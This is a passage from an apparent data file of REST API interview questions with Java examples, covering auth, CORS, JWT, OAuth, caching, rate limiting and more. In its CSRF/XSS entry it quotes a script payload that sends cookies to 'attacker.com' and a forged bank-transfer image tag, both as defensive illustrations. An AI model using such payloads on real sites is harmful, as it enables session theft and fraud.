      "**JWT Bearer Tokens:** Digitally signed, stateless self-contained JSON tokens containing user identity and claim roles. Validated locally by microservices without database lookups.",
      "**OAuth 2.0 / OIDC:** Delegated authorization protocol. User authenticates with Identity Provider (Okta, Auth0, Keycloak) which issues Access Tokens to client applications.",
    ],
    example: {
      language: "JAVA",
      code: `// Spring Security Bearer Token Authentication Extraction
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
        String authHeader = request.getHeader("Authorization");
        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            String token = authHeader.substring(7);
            Claims claims = jwtProvider.validateToken(token);
            SecurityContextHolder.getContext().setAuthentication(createAuthToken(claims));
        }
        filterChain.doFilter(request, response);
    }
}`,
    },
    interviewTip:
      "Clarify: 'Authentication proves identity (Who are you?); Authorization proves permissions (What are you allowed to do?).'",
    commonTrap:
      "Passing credentials or secret keys in URL query parameters (`/api/data?apiKey=secret`). Query parameters are saved in plaintext in web server access logs and browser history.",
    followUpQuestions: [
      "Why should API keys never be passed in URL query params?",
      "What is the difference between Access Tokens and Refresh Tokens?",
    ],
    relatedTopics: ["REST APIs", "Security", "JWT", "OAuth2"],
    tags: ["REST APIs", "Security", "Auth"],
  },
  {
    topicSlug: "rest-apis",
    slug: "cors-mechanisms-preflight-requests",
    title: "What is CORS (Cross-Origin Resource Sharing) and how do preflight requests work?",
    difficulty: "MEDIUM",
    subtopic: "Security",
    synopsis: "Browser security enforcing cross-origin access rules via HTTP headers and `OPTIONS` preflight checks.",
    shortAnswer:
      "CORS is a browser security mechanism that restricts cross-origin HTTP requests originating from a web app hosted on one domain (`frontend.com`) to an API hosted on another domain (`api.com`). For non-simple requests, the browser sends an automatic `OPTIONS` preflight request to check server permission headers (`Access-Control-Allow-Origin`).",
    detailedExplanation: [
      "**Same-Origin Policy (SOP):** Browsers block cross-origin requests by default unless the destination server explicitly opts in via CORS headers.",
      "**Simple Requests:** Standard `GET` or `POST` requests with basic `Content-Type` (`text/plain`, `multipart/form-data`) do not trigger preflight.",
      "**Preflight Trigger:** Custom headers (`Authorization`, `X-Custom-Header`), `PUT`, `DELETE`, or `Content-Type: application/json` trigger an automatic `OPTIONS` preflight request.",
      "**Server Response Headers:**",
      "- `Access-Control-Allow-Origin: https://frontend.com`",
      "- `Access-Control-Allow-Methods: GET, POST, PUT, DELETE`",
      "- `Access-Control-Allow-Headers: Authorization, Content-Type`",
      "- `Access-Control-Max-Age: 86400` (Caches preflight result for 24h).",
    ],
    example: {
      language: "JAVA",
      code: `@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
                .allowedOrigins("https://app.company.com")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowedHeaders("Authorization", "Content-Type")
                .allowCredentials(true)
                .maxAge(3600); // Preflight cache time in seconds
    }
}`,
    },
    interviewTip:
      "Highlight: CORS is enforced by the BROWSER, not the server. Postman or cURL bypass CORS completely because they do not implement browser Same-Origin Policy.",
    commonTrap:
      "Setting `Access-Control-Allow-Origin: *` in production while setting `allowCredentials(true)`. Browsers reject wildcard origins when credentials (cookies/auth headers) are sent.",
    followUpQuestions: [
      "Why does cURL not enforce CORS?",
      "How to configure CORS at API Gateway level?",
    ],
    relatedTopics: ["REST APIs", "CORS", "Security"],
    tags: ["REST APIs", "Security", "CORS"],
  },
  {
    topicSlug: "rest-apis",
    slug: "jwt-structure-stateless-authentication",
    title: "What is JSON Web Token (JWT) structure and how is it used in stateless REST API authentication?",
    difficulty: "MEDIUM",
    subtopic: "Security",
    synopsis: "Base64Url encoded Header.Payload.Signature token evaluated locally by API servers.",
    shortAnswer:
      "A JWT is a compact, URL-safe token format consisting of 3 dot-separated Base64Url parts: `Header.Payload.Signature`. The client passes the token in `Authorization: Bearer <token>`. The server verifies the cryptographic signature locally using its secret key without making a database lookup.",
    detailedExplanation: [
      "**1. Header:** Specifying algorithm (`alg: 'HS256'`) and token type (`typ: 'JWT'`).",
      "**2. Payload (Claims):** Contains user claims (`sub: 'usr_100'`, `name: 'Niraj'`, `role: 'ADMIN'`, `exp: 1770000000`).",
      "**3. Signature:** HMAC-SHA256 signature generated by hashing `Base64(Header) + '.' + Base64(Payload)` using the server's private secret key.",
      "**Stateless Verification:** Any microservice possessing the public key or shared secret can verify token authenticity and extract user roles instantaneously.",
    ],
    example: {
      language: "JAVA",
      code: `// Decoded JWT Structure
// Header:   {"alg":"HS256","typ":"JWT"}
// Payload:  {"sub":"1234567890","name":"Niraj","role":"ADMIN","exp":1770000000}
// Signature: HMACSHA256(base64UrlEncode(Header) + "." + base64UrlEncode(Payload), secretKey)

// Transmitted in HTTP Header:
// Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik5pcmFqIn0.signature`,
    },
    interviewTip:
      "Remind interviewers that JWT payload data is Base64 ENCODED, NOT ENCRYPTED. Anyone can decode and view claims. Never store sensitive passwords or credit cards inside JWT payloads.",
    commonTrap:
      "Failing to check token expiration (`exp`) claim or accepting the `alg: 'none'` vulnerability in outdated JWT verification libraries.",
    followUpQuestions: [
      "What is the JWT `alg: none` security vulnerability?",
      "How do you invalidate a stateless JWT before its natural expiration time?",
    ],
    relatedTopics: ["REST APIs", "JWT", "Security"],
    tags: ["REST APIs", "Security", "Auth"],
  },
  {
    topicSlug: "rest-apis",
    slug: "oauth2-authorization-code-flow-pkce",
    title: "What is OAuth 2.0 Authorization Code Flow with PKCE?",
    difficulty: "HARD",
    subtopic: "Security",
    synopsis: "Secure authorization code grant utilizing code verifier/challenge for SPA and mobile apps.",
    shortAnswer:
      "OAuth 2.0 Authorization Code Flow with PKCE (Proof Key for Code Exchange) is the security standard for public clients (Single-Page Apps, Mobile Apps) that cannot securely store client secrets. It prevents authorization code interception attacks by dynamically binding code requests to a cryptographically generated `code_verifier` and `code_challenge` pair.",
    detailedExplanation: [
      "**Problem with Public Clients:** Mobile apps (iOS/Android) and Single Page Apps (React) can be decompiled or inspected, making hardcoded `client_secret` storage unsafe.",
      "**PKCE Mechanics:**",
      "1. Client generates a random secret `code_verifier` and computes its SHA-256 hash (`code_challenge`).",
      "2. Client redirects user to Auth Server with `code_challenge` and `code_challenge_method=S256`.",
      "3. Auth Server authenticates user and returns an Authorization Code to client callback URI.",
      "4. Client exchanges Authorization Code + original unhashed `code_verifier` for Access Token.",
      "5. Auth Server hashes `code_verifier` and compares with original `code_challenge`. If matching, it issues Access Token.",
    ],
    example: {
      language: "JAVA",
      code: `// PKCE Code Challenge Calculation (SHA-256)
String codeVerifier = generateRandomBase64String(64); // Random 64 char string
byte[] bytes = MessageDigest.getInstance("SHA-256").digest(codeVerifier.getBytes(StandardCharsets.US_ASCII));
String codeChallenge = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);

// Step 1: GET /authorize?response_type=code&client_id=my-app&code_challenge=...&code_challenge_method=S256
// Step 2: POST /token -> body: { code: "...", code_verifier: codeVerifier }`,
    },
    interviewTip:
      "Emphasize: OAuth 2.0 is an AUTHORIZATION framework (granting access permissions), not an Authentication protocol. OpenID Connect (OIDC) is the layer on top of OAuth 2.0 that provides Authentication (identity).",
    commonTrap:
      "Using the legacy Implicit Flow in modern Single Page Apps. Implicit Flow is deprecated due to security vulnerabilities; PKCE is now mandatory.",
    followUpQuestions: [
      "Why was OAuth 2.0 Implicit Flow deprecated?",
      "What is the difference between OAuth 2.0 and OpenID Connect (OIDC)?",
    ],
    relatedTopics: ["REST APIs", "OAuth2", "PKCE", "Security"],
    tags: ["REST APIs", "Security", "OAuth2"],
  },
  {
    topicSlug: "rest-apis",
    slug: "csrf-and-xss-prevention-rest-apis",
    title: "What is CSRF and XSS and how do you protect REST APIs against them?",
    difficulty: "MEDIUM",
    subtopic: "Security",
    synopsis: "Cross-Site Request Forgery (CSRF) and Cross-Site Scripting (XSS) defense mechanisms.",
    shortAnswer:
      "CSRF tricks a logged-in user's browser into sending unwanted requests to a REST API via credentials/cookies. Prevent CSRF using `SameSite=Strict` cookies, Anti-CSRF tokens, or header-based JWT authentication (`Authorization: Bearer`). XSS injects malicious client-side scripts into web pages. Prevent XSS via strict input sanitization, HTML escaping, and `Content-Security-Policy` headers.",
    detailedExplanation: [
      "**CSRF (Cross-Site Request Forgery):** Affects cookie-based authentication. A malicious site (`evil.com`) includes `<img src='https://bank.com/api/transfer?amount=1000'>`. If `bank.com` uses cookies, the browser attaches them automatically. Protection: Store tokens in `Authorization: Bearer` headers (browsers do NOT auto-attach custom headers) or set `SameSite=Strict` on cookies.",
      "**XSS (Cross-Site Scripting):** Attacker injects `<script>fetch('http://attacker.com?cookie='+document.cookie)</script>` into user comments. Protection: Sanitize input (`Jsoup`), use React (auto-escapes JSX), store refresh tokens in `HttpOnly` cookies (inaccessible to `document.cookie`), and enforce CSP headers.",
    ],
    example: {
      language: "JAVA",
      code: `// Secure Cookie Header (Preventing XSS & CSRF)
ResponseCookie cookie = ResponseCookie.from("refreshToken", token)
        .httpOnly(true)   // Prevents XSS script access via document.cookie
        .secure(true)     // Requires HTTPS connection
        .sameSite("Strict") // Prevents CSRF request forwarding from 3rd-party sites
        .path("/api/v1/auth/refresh")
        .maxAge(7 * 24 * 3600)
        .build();
response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());`,
    },
    interviewTip:
      "Highlight: If a REST API uses purely header-based JWT tokens (`Authorization: Bearer`), it is immune to CSRF because browsers never auto-send custom headers across origins.",
    commonTrap:
      "Storing sensitive JWT access tokens in browser `localStorage`. `localStorage` is vulnerable to XSS script theft. Store tokens in memory or `HttpOnly` cookies.",
    followUpQuestions: [
      "Why is `HttpOnly` flag essential for sensitive cookies?",
      "How does `SameSite=Lax` vs `SameSite=Strict` behave?",
    ],
    relatedTopics: ["REST APIs", "Security", "CSRF", "XSS"],
    tags: ["REST APIs", "Security"],
  },

  /* ==========================================================================
     7. Caching, Performance & Infrastructure
     ========================================================================== */
  {
    topicSlug: "rest-apis",
    slug: "http-caching-mechanisms-etag-cache-control",
    title: "How does HTTP Caching work in REST APIs (`Cache-Control`, `ETag`, `If-None-Match`)?",
    difficulty: "MEDIUM",
    subtopic: "Caching",
    synopsis: "Freshness caching via `Cache-Control` and validation caching via `ETag` / `If-None-Match`.",
    shortAnswer:
      "HTTP Caching uses 2 strategies: 1) Freshness Caching (`Cache-Control: max-age=3600`), allowing clients/CDNs to serve cached responses directly without hitting the server. 2) Validation Caching (`ETag` and `If-None-Match`), where the client sends the cached ETag back to the server. If data has not changed, the server returns `304 Not Modified` with zero body payload.",
    detailedExplanation: [
      "**Cache-Control Directives:**",
      "- `max-age=3600`: Response is fresh for 3600 seconds.",
      "- `no-cache`: Must revalidate response with origin server using `ETag` before serving from cache.",
      "- `no-store`: Strictly forbids saving response in any browser or CDN disk cache.",
      "- `public` vs `private`: `public` allows intermediate CDNs to cache; `private` restricts cache to target user browser.",
      "**ETag (Entity Tag) Validation:** Server generates a hash of the response resource (`ETag: 'w/901a8f'`). Client caches response and ETag. On next request, client sends `If-None-Match: 'w/901a8f'`. Server compares hash; if unchanged, returns lightweight `304 Not Modified`.",
    ],
    example: {
      language: "JAVA",
      code: `@GetMapping("/products/{id}")
public ResponseEntity<ProductDto> getProduct(@PathVariable String id, WebRequest request) {
    ProductDto product = productService.findById(id);
    String etag = "W/\"" + product.hashCode() + "\"";
    
    // Check if client sent matching If-None-Match header
    if (request.checkNotModified(etag)) {
        return null; // Automatically returns 304 Not Modified with empty body!
    }
    
    return ResponseEntity.ok()
            .cacheControl(CacheControl.maxAge(1, TimeUnit.HOURS).cachePublic())
            .eTag(etag)
            .body(product);
}`,
    },
    interviewTip:
      "Explain how ETags save immense network bandwidth: Instead of returning a 5MB JSON payload, `304 Not Modified` transfers 200 bytes of HTTP headers.",
    commonTrap:
      "Confusing `no-cache` with `no-store`. `no-cache` DOES store the response locally; it just forces validation before reuse. `no-store` forbids storing altogether.",
    followUpQuestions: [
      "What is `Last-Modified` and `If-Modified-Since` validation?",
      "How do Cloudflare CDNs handle ETag header matching?",
    ],
    relatedTopics: ["REST APIs", "Caching", "Performance"],
    tags: ["REST APIs", "Caching", "Performance"],
  },
  {
    topicSlug: "rest-apis",
    slug: "optimistic-concurrency-control-etags-if-match",
    title: "How do you handle optimistic concurrency control in REST APIs using ETags?",
    difficulty: "HARD",
    subtopic: "Caching",
    synopsis: "Preventing lost updates using `ETag` and `If-Match` header (HTTP 412 Precondition Failed).",
    shortAnswer:
      "Optimistic concurrency control prevents the 'Lost Update' problem when two users edit the same resource simultaneously. The server issues an `ETag` (version hash) on GET. When updating via PUT/PATCH, the client must submit `If-Match: <ETag>`. If another edit changed the ETag in the interim, the server rejects the edit with `412 Precondition Failed`.",
    detailedExplanation: [
      "**Lost Update Scenario:** User A and User B fetch `/articles/10` (Version 1). User A saves changes (Database advances to Version 2). User B saves changes 1 second later, overwriting User A's edits silently.",
      "**ETag / If-Match Prevention Flow:**",
      "1. Client fetches `GET /articles/10` -> Server returns `ETag: 'v1'`, payload: `{ 'title': 'Hello' }`.",
      "2. Client edits and submits `PUT /articles/10` with header `If-Match: 'v1'`.",
      "3. Server compares `If-Match` against current DB resource version hash.",
      "4. If current DB version is 'v2' (because User A edited first), server rejects User B's request with `412 Precondition Failed`.",
      "5. User B receives 412, re-fetches latest 'v2' data, merges changes, and retries.",
    ],
    example: {
      language: "JAVA",
      code: `@PutMapping("/articles/{id}")
public ResponseEntity<Article> updateArticle(
        @PathVariable Long id,
        @RequestHeader("If-Match") String ifMatch,
        @RequestBody ArticleUpdateRequest update) {
        
    Article current = articleService.findById(id);
    String currentEtag = "\"" + current.getVersion() + "\"";
    
    if (!currentEtag.equals(ifMatch)) {
        return ResponseEntity.status(HttpStatus.PRECONDITION_FAILED).build(); // 412
    }
    
    Article saved = articleService.update(current, update);
    return ResponseEntity.ok().eTag("\"" + saved.getVersion() + "\"").body(saved);
}`,
    },
    interviewTip:
      "Contrast Optimistic Concurrency (`ETag` + `If-Match`) with Pessimistic Locking (`SELECT FOR UPDATE`). Optimistic concurrency scales infinitely better for web REST APIs.",
    commonTrap:
      "Using pessimistic database locks across stateless HTTP requests. Holding database transactions open across network HTTP calls creates catastrophic DB connection pool exhaustion.",
    followUpQuestions: [
      "What is `412 Precondition Failed` vs `409 Conflict`?",
      "How to implement `@Version` annotation in Hibernate JPA for optimistic locking?",
    ],
    relatedTopics: ["REST APIs", "Concurrency", "Database", "ETag"],
    tags: ["REST APIs", "Concurrency", "Database"],
  },
  {
    topicSlug: "rest-apis",
    slug: "rate-limiting-algorithms-token-bucket-sliding-window",
    title: "How do you implement Rate Limiting and Throttling in REST APIs?",
    difficulty: "MEDIUM",
    subtopic: "Performance",
    synopsis: "Protecting API availability using Token Bucket, Leaky Bucket, and Sliding Window Log algorithms.",
    shortAnswer:
      "Rate limiting controls request volume to prevent denial-of-service (DoS) and resource exhaustion. Common algorithms include Token Bucket (allows bursts), Leaky Bucket (smooths traffic rate), and Sliding Window Log/Counter (accurate window tracking). When limit is exceeded, server returns `429 Too Many Requests` with `Retry-After` header.",
    detailedExplanation: [
      "**Token Bucket Algorithm:** A bucket holds up to N tokens. Tokens refill at a constant rate R per second. Each API request consumes 1 token. If bucket is empty, request is rejected (`429`). Excellent for allowing short traffic bursts.",
      "**Leaky Bucket Algorithm:** Requests enter a FIFO queue and leak out at a constant fixed execution rate. Excess requests overflow the queue and get dropped. Smooths out traffic spikes.",
      "**Sliding Window Counter (Redis):** Tracks request counts in micro-time windows using Redis ZSETs or atomic counters. Combines memory efficiency with high accuracy.",
      "**Standard Response Headers:**",
      "- `X-RateLimit-Limit: 100` (Max allowed in window).",
      "- `X-RateLimit-Remaining: 5` (Tokens left).",
      "- `X-RateLimit-Reset: 1770000000` (Unix timestamp when window resets).",
      "- `Retry-After: 30` (Seconds to wait before retrying).",
    ],
    example: {
      language: "JAVA",
      code: `// Spring Boot Rate Limiting Interceptor with Bucket4j (Token Bucket)
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
    String apiKey = request.getHeader("X-API-Key");
    Bucket bucket = rateLimitService.resolveBucket(apiKey);
    
    if (bucket.tryConsume(1)) {
        response.addHeader("X-RateLimit-Remaining", String.valueOf(bucket.getAvailableTokens()));
        return true;
    } else {
        response.setStatus(429); // 429 Too Many Requests
        response.addHeader("Retry-After", "60");
        return false;
    }
}`,
    },
    interviewTip:
      "In System Design interviews, recommend implementing rate limiting at the API Gateway layer (Kong, AWS API Gateway, Nginx) backed by Redis rather than inside individual application microservices.",
    commonTrap:
      "Storing rate limiting token counters in local application memory. In a multi-instance server cluster, requests bypass limits unless state is stored in centralized Redis.",
    followUpQuestions: [
      "How to implement atomic Token Bucket in Redis using Lua scripts?",
      "What is the difference between Rate Limiting and Throttling?",
    ],
    relatedTopics: ["REST APIs", "Rate Limiting", "Redis", "System Design"],
    tags: ["REST APIs", "System Design", "Performance"],
  },
  {
    topicSlug: "rest-apis",
    slug: "api-gateway-role-microservices",
    title: "What is the role of an API Gateway in RESTful Microservices?",
    difficulty: "MEDIUM",
    subtopic: "Infrastructure",
    synopsis: "Single entry point for request routing, SSL termination, authentication, rate limiting, and aggregation.",
    shortAnswer:
      "An API Gateway acts as a reverse proxy single point of entry for all client requests in a microservices architecture. It abstracts backend microservice topology and provides cross-cutting concerns: Request Routing, SSL/TLS Termination, Authentication/Authorization, Rate Limiting, Response Caching, and Request Transformation.",
    detailedExplanation: [
      "**Centralized Cross-Cutting Concerns:** Eliminates duplicate authentication, CORS, rate-limiting, and logging code from every microservice codebase.",
      "**Protocol Translation:** Translates external client REST/JSON calls into internal high-performance gRPC Protobuf or Kafka events for backend services.",
      "**Security Boundary:** Shields internal microservice IP addresses and network topology behind a hardened DMZ perimeter.",
      "**Popular Technologies:** Kong API Gateway, AWS API Gateway, Nginx, Spring Cloud Gateway, Traefik.",
    ],
    example: {
      language: "JAVA",
      code: `// Spring Cloud Gateway Route Definition
@Bean
public RouteLocator customRouteLocator(RouteLocatorBuilder builder) {
    return builder.routes()
        .route("user_service", r -> r.path("/api/v1/users/**")
            .filters(f -> f.stripPrefix(1).filter(jwtAuthFilter))
            .uri("lb://USER-SERVICE"))
        .route("order_service", r -> r.path("/api/v1/orders/**")
            .filters(f -> f.requestRateLimiter(c -> c.setRateLimiter(redisRateLimiter())))
            .uri("lb://ORDER-SERVICE"))
        .build();
}`,
    },
    interviewTip:
      "Warn against the 'Smart Gateway / Single Point of Failure' anti-pattern: Keep business logic out of the API Gateway; keep the gateway focused strictly on routing, security, and traffic control.",
    commonTrap:
      "Embedding core domain business rules or database calls directly inside API Gateway scripts.",
    followUpQuestions: [
      "What is the difference between an API Gateway and an Ingress Controller in Kubernetes?",
      "What is the Backend-for-Frontend (BFF) pattern vs centralized API Gateway?",
    ],
    relatedTopics: ["REST APIs", "API Gateway", "Microservices"],
    tags: ["REST APIs", "Microservices", "Architecture"],
  },
  {
    topicSlug: "rest-apis",
    slug: "circuit-breaker-pattern-rest-dependencies",
    title: "What is a Circuit Breaker pattern in REST API microservice calls?",
    difficulty: "MEDIUM",
    subtopic: "Infrastructure",
    synopsis: "Preventing cascading system failures by tripping circuit states (Closed, Open, Half-Open) on downstream outages.",
    shortAnswer:
      "The Circuit Breaker pattern monitors outgoing HTTP REST calls to downstream services. If failure thresholds are exceeded, the circuit trips to OPEN state, failing fast immediately without calling the broken service. After a sleep window, it enters HALF-OPEN state to test recovery.",
    detailedExplanation: [
      "**Cascading Failures:** If Service A calls Service B, and Service B hangs due to DB overload, Service A's worker threads block waiting for socket timeouts. Eventually Service A runs out of threads and crashes, causing a system-wide cascade.",
      "**3 Circuit States:**",
      "- **CLOSED (Normal):** Requests pass through to downstream service. Metrics monitor success/failure rate.",
      "- **OPEN (Tripped):** Calls fail immediately with fallback response without hitting downstream service. Gives downstream service time to recover.",
      "- **HALF-OPEN (Testing):** Allows a limited trial number of requests through. If successful, resets to CLOSED; if failing, reverts to OPEN.",
    ],
    example: {
      language: "JAVA",
      code: `// Resilience4j CircuitBreaker in Spring Boot REST Client
@Service
public class PaymentClient {

    @CircuitBreaker(name = "paymentService", fallbackMethod = "paymentFallback")
    public PaymentResponse processPayment(PaymentRequest request) {
        return restTemplate.postForObject("https://payment-provider/api/charge", request, PaymentResponse.class);
    }

    // Fallback executed immediately when Circuit is OPEN
    public PaymentResponse paymentFallback(PaymentRequest request, Throwable t) {
        return new PaymentResponse("PENDING_OFFLINE_QUEUE", "Provider temporarily unavailable");
    }
}`,
    },
    interviewTip:
      "Mention Resilience4j or Envoy proxy as modern Circuit Breaker libraries used in microservices.",
    commonTrap:
      "Setting connection timeouts too high (e.g. 30 seconds) on REST template clients, defeating circuit breaker responsiveness.",
    followUpQuestions: [
      "What is the difference between Circuit Breaker and Rate Limiter?",
      "How to configure sliding window error rate percentages in Resilience4j?",
    ],
    relatedTopics: ["REST APIs", "Circuit Breaker", "Resilience4j", "Microservices"],
    tags: ["REST APIs", "Microservices", "Resilience"],
  },
  {
    topicSlug: "rest-apis",
    slug: "distributed-tracing-context-propagation-rest",
    title: "How do you pass tracing context across microservice REST calls?",
    difficulty: "HARD",
    subtopic: "Infrastructure",
    synopsis: "Propagating correlation IDs (`X-Correlation-ID`) and W3C `traceparent` headers across HTTP boundaries.",
    shortAnswer:
      "Distributed Tracing tracks a request's execution path across multiple microservices by injecting unique trace identifiers into HTTP request headers. Modern standards use W3C Trace Context headers (`traceparent`, `tracestate`) or custom correlation headers (`X-Correlation-ID`, `X-Request-ID`).",
    detailedExplanation: [
      "**Problem:** A single user click triggers a chain of 10 microservice REST calls. When an error occurs at step 7, finding the logs across 10 log aggregators is impossible without a unified ID.",
      "**W3C `traceparent` Header Format:** `version-traceid-parentid-traceflags` (e.g., `00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01`).",
      "**Trace ID:** Globally unique 128-bit ID identifying the entire transaction chain.",
      "**Span ID (Parent ID):** 64-bit ID identifying a single operation segment within a service.",
      "**Tooling:** OpenTelemetry, Jaeger, Zipkin, Micrometer Tracing automatically intercept REST Template and WebClient calls to propagate headers.",
    ],
    example: {
      language: "JAVA",
      code: `// Spring WebClient Filter automatically propagating W3C traceparent header
WebClient webClient = WebClient.builder()
        .filter((request, next) -> {
            String traceId = Tracer.currentSpan().context().traceId();
            ClientRequest bearerRequest = ClientRequest.from(request)
                    .header("X-Correlation-ID", traceId)
                    .build();
            return next.exchange(bearerRequest);
        })
        .build();`,
    },
    interviewTip:
      "Mention OpenTelemetry as the CNCF vendor-neutral industry standard for distributed tracing metrics and log correlation.",
    commonTrap:
      "Dropping correlation headers when executing async multi-threaded tasks (`ExecutorService`). Use context-aware task decorators to propagate tracing contexts across threads.",
    followUpQuestions: [
      "What is OpenTelemetry (OTel) and how does it auto-instrument Java REST apps?",
      "How to configure MDC (Mapped Diagnostic Context) in SLF4J/Logback for correlation IDs?",
    ],
    relatedTopics: ["REST APIs", "Distributed Tracing", "OpenTelemetry"],
    tags: ["REST APIs", "Microservices", "Observability"],
  },

  /* ==========================================================================
     8. Operations, Testing & Edge Cases
     ========================================================================== */
  {
    topicSlug: "rest-apis",
    slug: "openapi-swagger-specification-importance",
    title: "What is OpenAPI / Swagger specification and why is it essential for REST APIs?",
    difficulty: "EASY",
    subtopic: "Operations",
    synopsis: "Machine-readable API specification standard (YAML/JSON) for documentation and SDK generation.",
    shortAnswer:
      "OpenAPI (formerly Swagger) is a standard, machine-readable specification format (YAML or JSON) for describing RESTful APIs. It documents URIs, HTTP methods, request parameters, response schemas, and authentication schemes, enabling interactive UI documentation (Swagger UI) and automated client SDK generation.",
    detailedExplanation: [
      "**Single Source of Truth:** Documents API contracts explicitly without requiring developers to read backend source code.",
      "**Automated Tooling:**",
      "- **Swagger UI:** Renders an interactive web interface where developers test API endpoints directly in browser.",
      "- **OpenAPI Generator:** Automatically generates strongly typed client SDKs (TypeScript, Java, Python, Swift) directly from `.yaml` specs.",
      "- **Mock Servers:** Generates instant mock servers (Prism) for frontend teams to code against before backend endpoints are built.",
    ],
    example: {
      language: "JAVA",
      code: `// Springdoc OpenAPI annotations in Spring Controller
@Operation(summary = "Get user by ID", description = "Returns single user record")
@ApiResponses(value = {
    @ApiResponse(responseCode = "200", description = "User found"),
    @ApiResponse(responseCode = "404", description = "User not found")
})
@GetMapping("/{id}")
public UserDto getUser(@PathVariable Long id) { return userService.find(id); }`,
    },
    interviewTip:
      "Contrast Code-First OpenAPI generation (Springdoc generates spec from code annotations) with Spec-First development (Write YAML spec first, then generate interface boilerplate). Spec-First is superior for team alignment.",
    commonTrap:
      "Maintaining API documentation manually in Confluence or Google Docs. Manual docs become outdated almost immediately.",
    followUpQuestions: [
      "What is Spec-First vs Code-First API design?",
      "How to run OpenAPI Generator in a CI/CD build pipeline?",
    ],
    relatedTopics: ["REST APIs", "OpenAPI", "Swagger", "Documentation"],
    tags: ["REST APIs", "Documentation", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "api-deprecation-strategies-sunset-headers",
    title: "How do you handle API Deprecation gracefully without breaking clients?",
    difficulty: "MEDIUM",
    subtopic: "Operations",
    synopsis: "Utilizing HTTP `Deprecation` and `Sunset` headers alongside phased sunset timelines.",
    shortAnswer:
      "API Deprecation requires communicating upcoming endpoint retirement to third-party clients without immediate service disruption. Standard HTTP headers (`Deprecation: true` and `Sunset: Wed, 11 Nov 2026 00:00:00 GMT`) signal deprecation status programmatically. Deprecated versions are monitored for traffic migration before final removal.",
    detailedExplanation: [
      "**HTTP Standard Headers:**",
      "- `Deprecation: @1770000000`: Signals that the endpoint is deprecated as of the specified date/timestamp.",
      "- `Sunset: Sun, 31 Dec 2026 23:59:59 GMT`: Identifies the exact upcoming date when the endpoint will be permanently shut down (returning 410 Gone).",
      "- `Link: <https://api.example.com/docs/v2-migration>; rel='deprecation'`: Points clients to migration documentation.",
      "**Phased Migration Policy:** 1) Announcement -> 2) Deprecation Headers active -> 3) Brownout periods (intentionally introducing temporary 429 delays to alert lagging clients) -> 4) Permanent Shutdown (410 Gone).",
    ],
    example: {
      language: "JAVA",
      code: `// Adding Deprecation and Sunset Headers in Spring Interceptor
@GetMapping("/v1/legacy-search")
public ResponseEntity<SearchResult> legacySearch() {
    return ResponseEntity.ok()
            .header("Deprecation", "true")
            .header("Sunset", "Wed, 16 Dec 2026 00:00:00 GMT")
            .header("Link", "<https://api.example.com/docs/v2>; rel=\"successor-version\"")
            .body(searchService.executeLegacy());
}`,
    },
    interviewTip:
      "Mention HTTP `410 Gone` as the standard response code to return AFTER a sunset date passes, indicating the resource existed previously but has been intentionally removed permanently.",
    commonTrap:
      "Deleting an old API endpoint abruptly without deprecation headers or email notifications, breaking mobile app clients in the wild.",
    followUpQuestions: [
      "What is the difference between 404 Not Found and 410 Gone?",
      "How to implement brownout testing for deprecated endpoints?",
    ],
    relatedTopics: ["REST APIs", "API Versioning", "Operations"],
    tags: ["REST APIs", "API Design", "Operations"],
  },
  {
    topicSlug: "rest-apis",
    slug: "json-patch-vs-json-merge-patch",
    title: "What is JSON Patch (RFC 6902) vs JSON Merge Patch (RFC 7396)?",
    difficulty: "HARD",
    subtopic: "Operations",
    synopsis: "Array of explicit operational patch instructions (RFC 6902) vs simple JSON partial delta object (RFC 7396).",
    shortAnswer:
      "JSON Merge Patch (RFC 7396) specifies partial modifications by sending a JSON object containing only the updated fields (sending null deletes a field). JSON Patch (RFC 6902) sends a JSON array of explicit operation objects (`add`, `remove`, `replace`, `move`, `copy`, `test`) applied sequentially.",
    detailedExplanation: [
      "**JSON Merge Patch (`application/merge-patch+json`):**",
      "- Payload: `{ 'email': 'new@example.com', 'phoneNumber': null }`",
      "- Advantage: Simple, human-readable.",
      "- Disadvantage: Cannot explicitly set a field to null value without deleting it; struggles with array element manipulation.",
      "**JSON Patch (`application/json-patch+json`):**",
      "- Payload: Array of operational commands with JSON pointers (`path`).",
      "- Advantage: Extremely precise. Can insert items into array positions, test preconditions, or move object attributes atomically.",
    ],
    example: {
      language: "JAVA",
      code: `// RFC 6902 JSON Patch Payload (Array of Operations)
// Content-Type: application/json-patch+json
[
  { "op": "test", "path": "/status", "value": "PENDING" },
  { "op": "replace", "path": "/email", "value": "niraj@example.com" },
  { "op": "add", "path": "/tags/0", "value": "VIP" },
  { "op": "remove", "path": "/legacyId" }
]`,
    },
    interviewTip:
      "If asked how to modify a specific element inside an array (e.g. update 3rd tag in array), explain that JSON Patch (RFC 6902) with `/tags/2` path pointer is the official IETF standard solution.",
    commonTrap:
      "Using standard `application/json` header when sending JSON Patch operational payloads instead of mandatory `application/json-patch+json` header.",
    followUpQuestions: [
      "How to process JSON Patch payloads in Java using Jackson and JsonPatch library?",
      "What is the `test` operation in JSON Patch used for?",
    ],
    relatedTopics: ["REST APIs", "JSON Patch", "HTTP Methods"],
    tags: ["REST APIs", "Standards", "API Design"],
  },
  {
    topicSlug: "rest-apis",
    slug: "handling-file-uploads-multipart-vs-presigned-urls",
    title: "How do you handle File Uploads in REST APIs (`multipart/form-data` vs Presigned S3 URLs)?",
    difficulty: "MEDIUM",
    subtopic: "Operations",
    synopsis: "Direct server upload via multipart streams vs direct-to-S3 upload via pre-signed URLs.",
    shortAnswer:
      "Small files can be uploaded directly to REST servers using `Content-Type: multipart/form-data`. For large files (video, images, archives), upload directly to cloud storage (AWS S3) using Presigned URLs: Client requests a temporary presigned upload URL from the REST API, then uploads the file directly to S3 via PUT, bypassing backend server memory and CPU.",
